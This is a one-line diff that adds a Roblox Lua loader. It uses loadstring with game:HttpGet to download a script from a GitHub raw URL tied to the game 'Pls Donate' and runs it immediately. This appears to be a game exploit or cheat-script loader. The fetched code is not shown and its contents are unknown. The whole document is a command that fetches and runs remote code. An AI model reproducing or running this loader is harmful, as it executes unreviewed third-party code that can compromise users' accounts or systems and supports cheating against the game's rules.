@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/Plsdonate_OFFICIAL/refs/heads/main/Spbit_script",true))()
